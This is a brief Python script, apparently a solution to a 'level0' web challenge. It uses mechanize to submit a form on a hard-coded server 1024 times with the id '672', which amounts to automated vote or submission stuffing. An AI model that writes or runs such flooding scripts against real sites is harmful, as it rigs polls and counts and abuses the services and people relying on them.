#!/usr/bin/python3
import mechanize
br = mechanize.Browser()
br.open('http://158.69.76.135/level0.php')
for i in range(1024):
    br.select_form(nr=0)
    br.form['id'] = '672'
    br.submit()
